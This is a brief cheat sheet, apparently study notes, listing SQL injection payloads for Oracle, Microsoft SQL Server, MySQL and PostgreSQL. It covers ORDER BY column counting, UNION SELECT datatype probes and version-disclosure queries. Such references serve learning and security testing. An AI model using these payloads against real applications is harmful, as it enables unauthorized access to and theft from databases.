<h2>SQL Injection(SQLi) Vulnerabilities </h2>

<b>SQL queries to determine the number of COLUMNS, DATATYPES of the columns and VERSION on Oracle, Microsoft, MySQL and PostgreSQL</b>

| Database | Columns Query | Datatypes | Version |
|----------|---------------|-----------|---------|
| Oracle |  ‘ order by 1-- </br> ‘ order by 3-- </br> In this example: 3 - 1 = 2(no. of columns) | ‘ UNION SELECT ‘a’ , ‘a’ FROM DUAL-- | ‘ UNION SELECT banner, NULL FROM v$version-- </br> SELECT banner FROM v$version |  
| Microsoft | same as Oracle | ‘ UNION SELECT ‘a’ , ‘a’-- | SELECT @@version | 
| MySQL | ‘ order by 1# | ‘ UNION SELECT ‘a’ , ‘a’# | SELECT @@version </br> ‘ UNION SELECT @@version, ‘a’#|
| PostgreSQL | same as Oracle | ‘ UNION SELECT ‘a’ , ‘a’-- | SELECT version() |


